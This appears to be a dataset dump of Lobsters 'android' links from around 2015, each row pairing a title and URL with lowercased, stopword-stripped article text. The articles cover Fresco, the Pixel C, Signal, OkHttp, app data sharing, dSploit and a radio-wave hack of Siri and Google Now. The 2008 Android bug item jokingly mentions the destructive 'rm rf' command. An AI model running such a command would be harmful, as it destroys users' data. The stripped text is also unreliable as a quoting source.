outputconsumer producercontext context consumer inputconsumer new inputconsumer outputconsumer minputproducerproduceresults inputconsumer context private static class inputconsumer implement consumer private final consumer moutputconsumer public inputconsumer consumer outputconsumer moutputconsumer outputconsumer public void onnewresult newresult boolean islast output doactualwork newresult moutputconsumeronnewresult output islast let u chain together complex series step still keep logically independent animation one many sticker animation stored gif webp format well liked people use facebook supporting pose new challenge animation one bitmap whole series must decoded stored memory displayed storing every single frame memory tenable large animation built animateddrawable drawable capable rendering animation two backends one gif webp animateddrawable implement standard android animatable interface caller start stop animation whenever want optimize memory usage cache frame memory small enough large decode fly behavior fully tunable caller backends implemented c code keep copy encoded data parsed metadata width height reference count data allows multiple drawables java side access single webp image simultaneously love thee let drawee way image downloaded network want show placeholder fail download show error indicator image arrive quick fadein animation often scale image even apply display matrix render desired size using hardware acceleration always scale around center image useful focus point may well elsewhere sometimes want show image rounded corner even circle operation need fast smooth previous implementation involved using android view object swapping placeholder view imageview time came turned quite slow changing view force android execute entire layout pas definitely something want happen user scrolling sensible approach would use android drawables swapped fly built drawee mvclike framework display image model called draweehierarchy implemented hierarchy drawables applies specific function imaging layering fadein scaling underlying image draweecontrollers connect image pipeline image loader take care backend image manipulation receive event back pipeline decide handle control draweehierarchy actually display whether placeholder error condition finished image draweeviews limited functionality provide decisive listen android system event signal view longer shown onscreen going offscreen draweeview tell draweecontroller close resource used image avoids memory leak addition controller tell image pipeline cancel network request gone yet thus scrolling long list image facebook often break network bank facility hard work displaying image gone calling code need instantiate draweeview specify uri optionally name parameter everything else happens automatically developer need worry managing image memory streaming update image everything done library fresco built elaborate tool set image display manipulation wanted share android developer community pleased announce today project available open source fresco painting technique popular around world century name honor many great artist used form italian renaissance master like raphael sigiriya artist sri lanka pretend level hope android app developer enjoy using library much enjoyed building
410,Lobsters,android,Android,Rumble: An internetless microblog,http://disruptedsystems.org/,rumble internetless microblog,ボタニカルエアカラーフォーム,
411,Lobsters,android,Android,The Pixel C was probably never supposed to run Android,http://arstechnica.com/gadgets/2015/12/the-pixel-cs-bumpy-road-from-chrome-os-concept-to-android-adoptee/,pixel c probably never supposed run android,enlarge full review flagship android device flagship chrome o device new ryu board trip plan project o canceled touchscreen interface semihidden virtual keyboard project athena first reference experimental window switcher plan b frankenboard chrome osandroid hybrid actually nailed abandoned frankenboard dead plan c christmas coming flash android ship google announced recent reddit ama path chrome o android merge run pixel c ryu project athena canceled posted canceled androidpowered pixel c chrome o android merging,enlarge left photoshop fantasy right disappointing realityron amadeo android actually google third operating system choice new pixel c tablet pixel c finally went sale full review note convertible tablet feel like hardware search software make compelling product perhaps internally google engineer seem searching compelling pixel c software package last year half contradiction hardware software visible tablet two example suffice hardware keyboard big screen would point productivity device software lack splitscreen mode apps optimized screen size hamstring pixel c hardware seems geared voice command functionality given array four topmounted microphone software nt support google alwayson voice command also odd device hail pixel team google two big hardware brand nexus cover flagship android device pixel denotes flagship chrome o device pixel c though pixel team broke rank produced android tablet view pixel c irregularity single explanation pixel c originally chrome o device back july new ryu board board reference motherboard chrome o device development popped chrome o open source repository trip chrome o source code revealed ryu light bar usb typec connector nvidia tegra soc wireless charging sound awful lot like pixel c especially wireless charging used charge keyboard via tablet battery closed open pixel c software take look android buildprop list sort base information see roproductnameryu listed property based commit safe say one point google definitely developing chrome o new android tablet appears pixel c planned launch hardware new alltouch version chrome o point got switch android story lot complicated though follows best timeline could piece together showing pixel c troubled development history plan project o canceled touchscreen interface chrome o onscreen keyboard appropriate touchscreen laptop perfect chrome o tablet chrome o experimental window switcher would pretty bad interface mouse perfect tablet long heard rumor chrome o tablet worked google headquarters touch work clearly visible public since least chrome o semihidden virtual keyboard could enabled via developer flag chrome o touch work could attributed laptop touchscreen form factor chromebook pixel chromebooks virtual keyboard would mostly useless laptop form factor destined tablet chrome o team actually working new interface called project athena appeared add lot functionality focused touchscreen usage july right around time ryu pixel c introduced chrome o repository first reference project athena started pop biggest addition knew experimental window switcher would taken chrome o window management ui taskbarbased interface cascading scrolling thumbnail ui look lot like android today chrome o taskbar interface great mouse tiny button would make poor experience touch user one google explicitly said new thumbnail ui chrome o tablet change would provide much larger target touch use would le efficient mouse user greater distance mouse would travel hypothetical chrome o tablet world wed imagine cascading thumbnail window management would touch user taskbar would stick around mouse user athena also added swipe gesture chrome o dragging bottom edge would enter overview mode thumbnailbased window switcher dragging left edge would switch previous task window touch ui dragging holding would enter splitscreen mode chrome o windowed o splitscreen mode would seem redundant unless consider usual mousebased window resizing nt work well touch drag gesture like would great theoretical chrome o tablet project athena never shipped though december five month introduction ryu project athena chrome o code base project canceled plan b frankenboard chrome osandroid hybrid touch interface run touchscreen mouse drive mousecentric chrome o pixel c pickle march android code started appearing chrome o ryu device tree chrome o really ca nt run without mouse apparently team decided making ryu boot chrome o android would fix know android nt replacement point work involved getting chrome o boot loader talk android digitimes actually nailed news month commits became public february site said google going start pushing chromebooks would boot android chrome o device going built quantum computer company rumored manufacture chromebook pixel google report said would google branded aka pixel like project athena idea lasted five july dualboot project seems scrapped comment ryu commit mentioned cancellation giving u evidence device hybrid nature saying abandoned frankenboard dead frankenboard course would excellent nickname device setup boot android chrome o plan c christmas coming flash android ship chrome o apparently picture pixel c look like decision made put android ship door september nexus launch event google announced android pixel c two month apparent cancellation dualboot plan leaving little time get regular android running pixel c launch event pixel c immediately seemed like rush job product announcement tacked end highprofile nexus launch almost immediately forgotten google nexus phone set attending journalist try whopping two pixel c set event nexus phone went preorder day event shipped day later pixel c customer google followed announcement two entire month radio silence leaving many wonder device ever coming google silence broken message along line surprise pixel c sale right december pixel c launch timing meant missed lucrative black fridaycyber monday shopping period sure sign troubled launch fact still sure retail box pixel c look review unit luxuriously shipped plastic bag inside brown cardboard box quick look pixel team recent reddit ama show team scrambling implement basic android feature like alwayson voice recognition promising android n bring feature device desperately need like split screen mode path chrome o android merge run pixel c connect dot public chrome o commits timeline look like junejuly ryu pixel c hardware project athena touchcentric chrome o introduced chrome o repository december project athena canceled march commits making ryu dualboot chrome o android posted july frankenboard dualboot ryu project canceled september google announces androidpowered pixel c codenamed ryu first hiccup happen first place work chrome o tablet abandoned guess something chrome o android merging introducing new chrome o form factor superseded crazy hybrid o year two later probably would nt received well customer chrome o customer large portion school business would especially value platform stability convincing customer move new hybrid o hard enough creating killing new form factor span two year would nt inspire lot confidence google complicating already rocky transition narrative explains pixel c seems lackluster today nt supposed way supposed flagship chrome o tablet worthy pixel name seems plan canceled though left androidpowered pixel another android tablet
412,Lobsters,android,Android,Signal Desktop,https://whispersystems.org/blog/signal-desktop/,signal desktop,private messaging ten finger multiple device single identifier update read follow u twitter view source available github community donation facebook want get involved signal hiring,today making signal desktop beta available signal desktop brings trusted private messaging experience signal desktop simplicity allows seamlessly continue conversation back forth mobile device desktop computerprivate messaging ten fingersas always everything endtoend encrypted painstakingly engineered order keep communication safe allowing send highquality private group text picture video message freemultiple device single identifiersignal desktop chrome app link phone incoming outgoing message displayed consistently device contact guess message switch device conversation started already thereandroid device nowupdate signal desktop io read morefor initial signal desktop beta linking android device supported follow u twitter update io app support signal desktopview sourceall code free open source available github allows expert verify protocol implementationslike everything open whisper system dedicated development supported community donation grant signal desktop contains advertisement cost anything use facebookwant get involved signal hiring
413,Lobsters,android,Android,Android Studio 2.0 Preview,http://android-developers.blogspot.com/2015/11/android-studio-20-preview.html,android studio preview,jamal eason android developer summit download new feature android studio instant run faster build deploy gpu profiler opengl e click next livestreamed monday tuesday streaming google,posted jamal eason product manager android one requested feature receive make app build deployment faster android studio today android developer summit announcing preview android studio featuring instant run dramatically improve development workflow android studio also including preview new gpu profiler update available canary release channel get feedback since initial release preview may want download run additional copy android studio parallel current version video new feature android studio instant run faster build deploy android studio instant run feature allows quickly see change running device emulator video getting started easy create new project android studio project already setup preexisting app open settingspreferences go build execution deployment instant run click enable instant run ensure correct gradle plugin project work instant run enable instant run android studio project select run normal android studio perform normal compilation packaging install step run app device emulator make edits source code resource pressing run deploy change directly running app new run stop action android studio instant run detailed guide setup try instant run click gpu profiler profiling opengl e android code even easier gpu profiler android studio tool early preview powerful show detail gl state command record entire session walk gl framebuffer texture app running opengl e code android studio gpu profiler get started first download gpu debugging tool package android studio sdk manager click detail gpu profiler tool set android app project profiling next taste bigger update latest release android studio going full release detail android developer summit livestreamed monday tuesday next week showing take advantage even feature android studio sure check back interested android deep technical content streaming hour content inaugural android developer summit next two day together codelabs content available online summit concludes android studio available today android studio canary channel let u know think new feature connecting android studio development team google
414,Lobsters,android,Android,An HTTP+SPDY client for Android and Java applications.,https://github.com/square/okhttp,httpspdy client android java application,okhttp project website get url full source post server full source okhttp recipe page requirement okio kotlin standard library track conscrypt branch release change log maven central available proguard mockwebserver maven central license,okhttp see project website documentation apis http way modern application network exchange data medium http efficiently make stuff load faster save bandwidth okhttp http client efficient default support allows request host share socket connection pooling reduces request latency available transparent gzip shrink download size response caching avoids network completely repeat request okhttp perseveres network troublesome silently recover common connection problem service multiple ip address okhttp attempt alternate address first connect fails necessary service hosted redundant data center okhttp support modern tl feature tl alpn certificate pinning configured fall back broad connectivity using okhttp easy requestresponse api designed fluent builder immutability support synchronous blocking call async call callback get url program downloads url print content string full source okhttpclient client new okhttpclient string run string url throw ioexception request request new requestbuilder url url build try response response clientnewcall request execute return responsebody string post server program post data service full source public static final mediatype json mediatypeget applicationjson okhttpclient client new okhttpclient string post string url string json throw ioexception requestbody body requestbodycreate json json request request new requestbuilder url url post body build try response response clientnewcall request execute return responsebody string example okhttp recipe page requirement okhttp work android api level java okhttp depends okio highperformance io kotlin standard library small library strong backwardcompatibility highly recommend keep okhttp uptodate autoupdating web browser staying current http client important defense potential security problem track dynamic tl ecosystem adjust okhttp improve connectivity security okhttp us platform builtin tl implementation java platform okhttp also support conscrypt integrates boringssl java okhttp use conscrypt first security provider securityinsertproviderat conscryptnewprovider okhttp branch support android api level java platform lack support tl used upgrading difficult backport critical fix branch december release change log release history latest release available maven central implementation snapshot build available proguard rule available mockwebserver okhttp includes library testing http http client latest release available maven central testimplementation license copyright square inc licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license
416,Lobsters,android,Android,"Android, Project Fi, and Updates",https://bitquabit.com/post/android-project-fi-and-updates/,android project fi update,edit stagefright woefully incomplete,edit mere day posting unrelated post google publicly apologized android rollout delay pushed android nexus device followed extremely rapidly android update think bodes incredibly well project fi still new service little doubt google work kink end moment going take step back watch see new rapid update cycle new norm think found ideal carrier platform still think encouraging new user stick io update cycle proven probably best course action want make clear right front absolutely io apologist wait first android phone come bought motorola droid launch day excited better multitasking keyboard better integration google service fact could use java instead objectivec much open platform restrict wanted sincerely excited neither hardware software quite ready time went three droids suffering one thankfully warrantycovered hardware failure another initially promising update cycle droid upgraded believe android quickly began see google issue getting new version android sane schedule couple year living android train hopped grabbed iphone mean gave android anything pretty confident android io would winner end anyway google would figure thing even google huge chunk telecom industry vested interest keeping apple dominating helping seen play already microsoft pc maker versus apple knew would end android would close gap take industry matter time google got operation running smoothly obviously happened android software hardware markedly improve even lot thing android got first genuine usability win instant reply notification assistant google turnbyturn direction crossapplication communication automatic app update ended buying nexus tablet found least developer fit need lot better ipad ever however one caveat android security story google get update phone sane schedule android phone longrunning unpatched security issue one thing think learned security last year team patch early often going vastly better protected one bother much nexus better pushing update tablet phone rate sideloading o pose major problem nonmissioncritical kept returning android phone project fi released signed immediately figured could finally finally cake eat google generally kept nexus device uptodate fi pricing model seemed like huge improvement forced major carrier love could go back android bid verizon adieu moment great doublewin emphatically happened first security update slow come whereas apple virtually always security issue patched well ahead disclosure window google seemed struggle stagefright came wait like everyone else patch patch happened woefully incomplete got wait patch patch android shipped month ago google left nexus phone barely year old android yes get project fi sideload support representative loudly actively discouraging support forum buy new exact situation exists carrier exact situation trying avoid ridiculous apple manages push update carrier day microsoft generally brings vaguely scooby doolike quality competition smartphone landscape manages get update lumia device within day also simple system window phone user optin get window updatestyle update ahead general availability meanwhile cell network google discouraging hard yet google clearly give apple keep product uptodate across dozen carrier google even keep product uptodate cellular network even make work throw towel suppose possible next phone run io one guarantee going run android
417,Lobsters,android,Android,Google's (Anti)Trust Issues,http://commonsware.com/blog/2015/11/11/google-anti-trust-issues.html,google anti trust issue,google anti trust issue multiple firsthand report android sdk documentation deeply stupid medium outlet subscriber,google anti trust issue google coming increasing fire government antitrust related anticompetition issue google increasingly developer due poorlyimplemented ban policy respect play store two trend may merge given recent move according multiple firsthand report google banning showing androidsupplied system dialog actually appear banned requesting requestignorebatteryoptimizations permission manifest even showing dialog however reason request permission unless planned show dialog point circumstance system dialog allows app ask user add battery optimization whitelist somewhat le affected doze mode buildversionsdkint string pkggetpackagename powermanager pmgetsystemservice powermanagerclass pmisignoringbatteryoptimizations pkg intent new intent settingsactionrequestignorebatteryoptimizations setdata uriparse package pkg startactivity banning backed snippet android sdk documentation note google play policy prohibit apps requesting direct exemption power management feature android doze app standby unless core function app adversely affected however opinion core function matter user developer google user developer might perfect harmony adding app whitelist mean google think warranted google set important user ban app true documentation would suggest report accurate deeply stupid tactically developer pop dialog user agrees add app whitelist developer start actionignorebatteryoptimizationsettings activity plus use toast something help guide user navigate awkward activity strategically google behavior inviting class action lawsuit providing ammunition pursuing antitrust claim personally concern far trendline google wields banhammer originally banned nothing banned malware based signature banned based content like eg pornography banned based name like ostensibly avoid user confusion banning based android apis like probably category banhammering forgetting write post stop app distribution channel play store among need high degree transparency respect get banned term stated rule term rule get applied practice based published report google transparent respect ban average battleship deck plate without transparency trust eroded channel similar transparency trust problem unique google however given global market dominance play store among respect need transparency encouraging app developer year depend solely upon play store android app distribution passing year need becomes stronger app developer find google decreasingly trustworthy distribution partner banned based play store policy described android sdk documentation similar future policy make sure document banning via blog reddit social medium medium outlet etc lacking transparency google ensure everybody know going stuck android problem subscriber access live office hour chat mark murphy help work challenge nov
418,Lobsters,android,Android,Facebook uses FlatBuffers on one billion Android devices,https://rwinslow.com/posts/facebook-uses-flatbuffers-on-one-billion-android-devices/,facebook us flatbuffers one billion android device,facebook us flatbuffers one billion android device ongoing series flatbuffers flatbuffers android apps benefit smoother ui faster startup le pressure garbage collector simpler app architecture get involved http googlegithubioflatbuffers learn,facebook us flatbuffers one billion android device post ongoing series flatbuffers july facebook announced use flatbuffers android apps particular use flatbuffers instead json clientserver communication go check article diagram showing flatbuffers organizes data memory give insight decisionmaking process led facebook make big change benefit benefit mention smoother ui json time parse facebook news story longer frame refresh interval mean user could experience visual stutter scrolled news feed flatbuffers help eliminate scroll stutter loading data faster curious frame refresh interval json getting parsed flatbuffers brought faster startup app startup json library required build parser flatbuffers generates parser compiletime eliminating delay le pressure garbage collector using json required many shortlived memory allocation placed lot pressure java garbage collector flatbuffers brings transient allocation zero simpler app architecture switching flatbuffers facebook found could eliminate internal caching layer get involved since facebook trust flatbuffers serialization billion device maybe like give try flatbuffers available c c go java javascript python like contribute use head homepage http googlegithubioflatbuffers get started author robert winslow consulting engineer help team launch great product learn
419,Lobsters,android,Android,User data plundering by Android and iOS apps is as rampant as you suspected,http://arstechnica.com/security/2015/11/user-data-plundering-by-android-and-ios-apps-is-as-rampant-as-you-suspected/,user data plundering android io apps rampant suspected,enlarge google play apple app store imei enlarge,enlarge sampling thirdparty data sharing android apps image io apps looked similar apps google play apple app store frequently send user highly personal information third party often little notice according recently published research studied apps researcher analyzed popular apps market found significant percentage regularly provided google apple third party user email address name physical location average android apps sent potentially sensitive data thirdparty domain average io app sent thirdparty domain case health apps sent search including word herpes interferon fewer five domain notification happening result study point current permission system io android limited comprehensively inform user degree data sharing occurs author study titled know survey behind scene personal data sharing third party mobile apps wrote apps android io today need permission request notification user input like pii behavioral data personal information commonly transmitted android apps user email address percent apps studied sending data total percent android apps sent user name percent transmitted user current gps coordinate percent sent address percent sent phone imei detail app drugscom meanwhile sent medical search term herpes interferon five domain including doubleclicknet googlesyndicationcom intellitxtcom quantservecom scorecardresearchcom although domain nt receive personal information also concerning android apps sent third party potentially sensitive combination data facebook example received user name location seven apps analyzed well groupon pinterest runkeeper tango text free timehop domain appboycom received data app called glide researcher also noticed android apps tested connected domain safemovedmcom researcher wrote purpose domain connection unclear time however ubiquity curious used phone without running app connection domain continued may background connection made android operating system thus excluded table figure order avoid misattributing connection apps tested relative emptiness information flow sent safemovedmcom indicate possibility communication via port outside http captured mitmproxy enlarge web request made android phone littleknown safemovedmcom domaintechnology science google spokeswoman contacted post nt provide information safemovedmcom say android operating system would connect web search provided variety theory purpose android connection domain io apps meanwhile often sent third party user current location percent apps analyzed study transmitting data total percent apps sent name percent apps sent email address pinterest app sent name four thirdparty domain including yoziofacebookcom crittercismcom flurrycom several apps study sent sensitive information instance period tracker lite app track menstrual cycle transmitted symptom input insomnia apsalarcom jobsearch apps indeedcom snagajob shared employmentrelated input nurse car mechanic four domain including healthcareresourcecom googleanalyticscom scorecardresearchcom one thing app user safeguard personal information researcher suggest supply false data possible app request researcher also said apps redesigned allow user opt data collection app store could prominently inform user third party may receive data
420,Lobsters,android,Android,Just Signal,https://whispersystems.org/blog/just-signal/,signal,signal android began iphone textsecure becoming signal redphone moving signal privacy possible signal make easy view source available github community donation try facebook want get involved signal hiring,today started rolling signal android unites simple private messaging simple private calling single app android culmination effort combine textsecure redphone one app began iphone bringing completion androidtextsecure becoming signalover next day user textsecure installed get normal update brings new name new version includes existing functionality textsecure plus ability make receive private call signal usersredphone moving signalusers redphone installed prompted install signal instead already signal installed uninstall redphone longer maintained independent appprivacy possible signal make easyas always signal us existing phone number address book separate logins usernames password pin manage losewe hear conversation see message one else either everything signal always endtoend encrypted painstakingly engineered order keep communication safeview sourceall code free open source available github allows expert verify protocol implementationslike everything open whisper system dedicated development supported community donation grant signal contains advertisement cost anything use try facebookwant get involved signal hiring
421,Lobsters,android,Android,Threema - Seriously secure messaging,https://threema.ch,threema seriously secure messaging,business solution threema work learn threema gateway learn threema broadcast learn,business solution everything need use threema organization threema work secure enterprise messaging solution offer convenient user management extensive app configuration option many feature tailored need organization learn threema gateway message api enables send receive threema message using software learn threema broadcast tool efficient topdown communication via feed distribution list bot centrally managed group learn
423,Lobsters,android,Android,"Android Defect Reboots Phone Every Time You Type ""Reboot"" (2008)",http://gizmodo.com/5080688/android-bug-reboots-phone-every-time-you-type-reboot,android defect reboots phone every time type reboot,android invisibly interprets every word command gotten update zdnet,latest big bug discovered android one craziest shipped phone basically android invisibly interprets every word command executes superuser privilege open keyboard type reboot yep reboot command stay away combination rm rf bug affect phone firmware version earlier lot people already gotten update pushed phone since go sorta haphazardly could stuck little bit hilarity potential rebooting friend phone kinda make worth though zdnet
424,Lobsters,android,Android,Karma: How Open Source changed my life.,http://www.evilsocket.net/2015/10/27/karma-how-open-source-changed-my-life/,karma open source changed life,italian open source mean free child never accepted pretty toy cost much dsploit story experiment xda thanks guy ettercap heaven forbid waste time unoriginal idea xd unacceptable dsploit free idea everyone idea idea free free,anarchy idea change thing time decided write purely personal post mainly reached stage life believe understood number thing like share hope helping someone facing similar circumstance feel knowledge english language would allowed express accurately wrote italian translated friend mine tnx open source mean mefor know like introduce explaining always considered open source mean fitting introduction story like tell youas left royal library alexandria preserved colosseum saint peter art music idea thing preserved sometimes good productive idea like discovery new cure others debatable religion barbaric custom violence nevertheless freethe beauty thing belong u like work art idea always free partake religion free choose idea code code code million programmer world like decided share whoever want preserving little good generation leave behind legacy oh one thing like add introducing child never accepted pretty toy cost much dsploit story experimentyears ago purchased first android terminal good little nerd began gathering information programming operating system oni using linux ever hard could learn signed xda read guide thanks guy began needed initial idea decided combine background network security first experiment namely first android app idea somehow replicate ettercap feature word carry mitm attack wifi network mobile phone using android application started researching google see someone already pulled something similar heaven forbid waste time unoriginal idea xd find someone else idea distributing semifree product purchasable unacceptable idea stolen lol ruined transformed something take started project soon became little ethical revenge dit took three day learn program android set first prototype would soon known dsploit needle say interface ugly sin slower molasses bugged old worked moreover freei immediately released code github posted link brief introduction xda idea tiny step would turn life around year project literally exploded next day inbox clogged reply xda thread people asking information wanting know compile code people comparing app semifree thing ruined idea started working like dog day kept job php programmer company rome night summer break wrote mile code considered new concept new function thing people even thought idea everyone idea idea free began exchanging email couple people developed app sometimes exchange tip time chatted turn far evil suit thought smart friendly guy open new ideasi became especially friendly one carried talking every following two three year period changed job moved new home however life hardly changed still average guy average salary short period time two month give take everything changed tornado hit seemed typical morning office friend company wrote saying something line never forget hey thing planning leaving crappy job joining u kind stuff always chaotic everything began make sense seemingly insignificant disconnected event maybe leading destined go without going detail transition relevant thing happened first job interview amsterdam mind girlfriend celebrate sixth anniversary decided time moved due issue already accepted discussed yada yada yada let fastforward today year working home yet high salary work thrilling working hour lately met load people know passing others sure able indulge thing even dream travelled world seen place last year seen lifetime able help many people hold dear needed solid help realized something make happy give necessary freedom build happiness freedom real thing sought life thing paying attention really quite clear going achieved without money came idea decided set project forked downloaded cloned improved upon belongs community wanted share story tell little debunk myth creation dsploit give hope like stay night name free guy let idea preserved let lead destined go
425,Lobsters,android,Android,The viability of JS frameworks on mobile,https://joreteg.com/blog/viability-of-js-frameworks-on-mobile,viability j framework mobile,billion active android user jeff atwood recent post heavycomplex javascript android hang let look research published research last december recent excited post redux care use beyond affect experience app user game use setup nice henrik propose written new stateless functional component longer need many feature heavy framework redux post leaning react dom syncing dump bunch stuff many layer code run even simple change state app next watch dan abramov talk react europe henrikjoreteg,whether like everyone using web apps running io iphone nexus connecting via superspeedy wifithe reality often anything connection older hardware often norm google report billion active android user many doubt running lessthantopoftheline hardwareand read stuff like jeff atwood recent post android performance may feel thing pretty bleak mobile weba notable pull quote post nutshell fastest known android device available today million android device much slower performs slower new iphone little worse era iphone ember depressingwe done enough research know issue really specific ember also affect angular heavycomplex javascript android perhaps heavycomplex part problem becoming systemic problem android ecosystem one go away next year may affect future discourse since bet heavily neardesktop javascript performance mobile device clearly happening io quite disastrously opposite androidok state mobile web ecosystem per atwoodhe end line longer optimistic change next two year untold million slow android device need start considering alternative discourse projectbummer right let go home least react native pretend building web apps actually writing native apps mobile web deadend apps hang catch discourse app atwood referring app used publish post discourse forum app sort meta anyway realized open network panel dev tool discourse page j transferred across wire gzipped size opinion forfeiting mobile even starti think better viable mobilei blaming even trying criticize atwood discourse huge number mobile web apps built way could really number sitesmy question simply heavier toolsframeworks even viable mobile use convinced arelet look researchthe fine folk filament group published research last december load time performance todomvc app popular web framework obviously todomvc bit contrived example may indicative realworld app great fit type research include base asset given framework least hopefully best practice wellyou may thinking load time performance atwood talking runtime performance yes atwood discussing runtime performance get shortly user care waiting load time clearly important part performance toothe whole post worth reading summary research finding seen graph opinion data angular ember two option atwood mentioned flat disqualify mobile useif know cocreated ampersand may assume flaming framework trying sell ampersandnopethe last two apps built actually contain ampersand code read recent excited post redux probably surprise youi care use beyond affect experience app usertools merely mean endok lied sort care pick want experience developer lead think mobile web viable sending megabyte j made app slowit game overmaybe mobile web fast enough need stop pretending get away ineffeciencies feel desktopi think need much minimalist startthe ever brilliant dominic tarr said many web developer day test phone locally building apps small screen need assume building weaker slower computer think need bake mobile dev workflow final prelaunch check curious use setup developingregardless even though phone may continue get faster faster think myopic assume ignore current speed problem hope resolved faster hardware although phone may continue improve think phone runtime targetas whole internet thing thing becomes thing wow sentence epically terrible leavingitanyway seems likely platform want write phone thing like watch tv vr small computer hooked large displaysthat nice henrik propose first written think html infer url alone rendered build time static html file turn browser even slow mobile one pretty friggin fast rendering html sent serversecondly think need le let hoopjumping backbone ampersand ember angular properly binding state ui certainly even many data feature closer inspection supporting binding capability result ship event system kind way create derivedcalculated property also observedyou certainly use react view layer one big win react point cheap rerender remove need many feature add complexity systemas simple example got backbonecollection model go rendering length collection ui using backbone paradigm getting value template initially certainly easy know point first rendered bind value change collection also update length rendered dom could set rerender addremovechange event could create observable property somewhere track would property total would updated change bind viewbut feel bit silly ever inspected instance backbonecollection know collectionmodels simply array backbonemodel array already value length called length sigh contrast react anything else allows u inexpensively rerender whole app promise react use length property directly render method individual component care whenever change state app rerenderso becomes simple reactcreateclass render function return span thispropsspecieslength span using new stateless functional component react destructuring assuming specie array object get downright beautiful entire component could written var aquarium specie span specieslength span aesthetic aside think much le stuff need longer need register multiple event listener collection le code le memory use longer need define another property compute creates observable duplicate already length le code le memory shoot may even need collection model observable collection could plain ol javascript array containing plain ol javascript object instead custom created observable model lot le code le memory le computation longer need many feature heavy framework allreact becomes biggest pill swallow simple test react reactdom built webpack gzipped end around comparison jquery weighs mingzip really pretty good hope would eventually much like happened jquery many core feature react would simply part browser apianyway rather needing observable model observable collection ability subscribe change derived property jazz probably get away architecture work like single application state object jsonlike structure plain j array objectsa set mutator function represent way state changed used time need change state tree could follow immutability principle like make sure replace anything change rerender whole app time mutator function donei simplifying bit pretty much redux work read redux post better overview need redux implement simple pattern described oh comparison redux weighs practically nothing approximately point leaning react dom syncing dump bunch stuffimagine much le code take much le work required browser deal simple set object array smart render calla opposed shipping class system event system templating system custom set observables type dom library like jquery required extra appspecific code write describing model collection property instantiating model keeping internal state cache model use enable capability require memory computation processing memory required value comparison also known dirtychecking see whether change need triggeredthere many layer code run even simple change state appthe ability rerender allows fundamentally lighter approachunfortunately perfect example line next ember runtime performance test atwood link hard imagine simplification flatout reduce amount computation required would also positive impact runtime performancealso clarify total file size may matter much long load time runtime performance still goodso next unless want web seen second class citizen mobile think need address performance issue believe web fast even mediocre hardware providing good developer experience btw doubt developer experience part watch dan abramov talk react europei certainly answer saying react redux kind panacea like enablebut far prerendering known html using lighter approach described seems working well keep sharing thought keep building stuff please samehit twitter henrikjoreteg better yet write response blog continue conversation go go gadget web
426,Lobsters,android,Android,Proportion of devices running vulnerable versions of Android,http://androidvulnerabilities.org/,proportion device running vulnerable version android,device analyzer submit contact u,able produce score due contribution made device analyzer member public device analyzer app longer available information project still available link information vulnerability listed site submit mdm data want know device used organisation vulnerable help contact u
427,Lobsters,android,Android,Hackers Can Silently Control Siri (and Google Now) From 16 Feet Away,http://www.wired.com/2015/10/this-radio-trick-silently-hacks-siri-from-16-feet-away/,hacker silently control siri google foot away,paper published ieee leaving siri google enabled phone login screen represents security risk disable voice command function lock screen go back top skip start article,siri may personal assistant voice one listens group french researcher discovered siri also helpfully obeys order hacker talk case one silently transmitting command via radio far foot away pair researcher anssi french government agency devoted information security shown use radio wave silently trigger voice command android phone iphone google siri enabled also pair headphone microphone plugged jack clever hack us headphone cord antenna exploiting wire convert surreptitious electromagnetic wave electrical signal appear phone operating system audio coming user microphone without speaking word hacker could use radio attack tell siri google make call send text dial hacker number turn phone eavesdropping device send phone browser malware site send spam phishing message via email facebook twitter sky limit everything voice interface remotely discreetly electromagnetic wave possibility inducing parasitic signal audio frontend voicecommandcapable device could raise critical security impact two french researcher josé lope esteves chaouki kasmi write paper published ieee vincent strubel director research group anssi put simply sky limit everything voice interface remotely discreetly electromagnetic wave researcher work first presented hack paris conference summer received little notice outside french website us relatively simple collection equipment generates electromagnetic wave laptop running opensource software gnu radio usrp softwaredefined radio amplifier antenna smallest form researcher say could fit inside backpack setup range around six half foot powerful form requires larger battery could practically fit inside car van researcher say could extend attack range foot experimental setup kasmi esteves used hijack smartphones voice command radio wave josé lope esteves video showing attack action demo researcher commandeer google via radio android smartphone force phone browser visit anssi website experiment performed inside radiowaveblocking faraday cage researcher say abide french regulation forbid broadcasting certain electromagnetic frequency kasmi esteves say faraday cage necessary attack work browser support video researcher silent voice command hack serious limitation work phone microphoneenabled headphone earbuds plugged many android phone google enabled lockscreen set respond command recognizes user voice iphones siri enabled lockscreen default new version siri iphone verifies owner voice google another limitation attentive victim would likely able see phone receiving mysterious voice command cancel mischief complete researcher contend hacker could hide radio device inside backpack crowded area use transmit voice command surrounding phone many might vulnerable hidden victim pocket purse could imagine bar airport lot people say strubel sending electromagnetic wave could cause lot smartphones call paid number generate cash although latest version io handsfree feature allows iphone owner send voice command merely saying hey siri kasmi esteves say attack work older version operating system iphone headphone long button cord allows user enable siri long press reverse engineering spoofing electrical signal button press radio attack trigger siri lockscreen without interaction user mandatory alwayson voice interface say kasmi make phone vulnerable make attack le complex course security conscious smartphone user probably already know leaving siri google enabled phone login screen represents security risk least apple case anyone get handson access device long able use voice command feature squeeze sensitive information contact recent even hijack social medium account radio attack extends range stealth intrusion making important user disable voice command function lock screen anssi researcher say contacted apple google work recommended fix advise better shielding headphone cord would force attacker use higherpower radio signal instance electromagnetic sensor phone could block attack note attack could also prevented software letting user create custom wake word launch siri google using voice recognition block stranger command neither google apple yet responded wired inquiry anssi research without security feature kasmi esteves recommend smartphone voice feature could represent security attacker phone hand one hidden next room use phone keyboard need enter pin code voice interface listening time authentication say strubel main issue goal paper point failing security model est earlier version story stated siri verification owner voice fact feature introduced iphone apology error go back top skip start article
428,Lobsters,android,Android,"Amazon stops selling Chromecast and Apple TV over Amazon Prime ""incompatability""",http://www.bloomberg.com/news/articles/2015-10-01/amazon-will-ban-sale-of-apple-google-video-streaming-devices,amazon stop selling chromecast apple tv amazon prime incompatability,detected unusual activity computer network,detected unusual activity computer network continue please click box let u know robot
429,Lobsters,android,Android,Google Press Event 9/29/15,http://www.youtube.com/watch?v=Jc-LEG0T_4c,google press event,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature google september press event youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature google september press event youtube
